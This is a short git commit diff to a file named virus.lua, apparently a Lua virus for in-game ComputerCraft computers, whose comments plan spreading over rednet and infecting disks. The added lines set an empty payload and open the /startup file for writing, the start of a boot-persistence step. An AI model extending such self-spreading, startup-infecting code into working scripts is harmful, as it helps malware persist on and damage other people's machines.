fa1395b32d493fcb48f076ef77b52f821e14a7ce
ZeeDerp <zeederpmaster@gmail.com>
2021-01-14 00:21:27 -0600

    Mass Fix

--- virus.lua
+++ virus.lua
@@ -2,3 +2,9 @@
 -- Spread via rednet if possible
 -- infect disks
 -- maybe use _G.fs to offload files?
+payload = ""
+if fs.exists("/startup") then
+    vic = fs.open("/startup","a")
+else
+    vic = fs.open("/startup","w")
+end
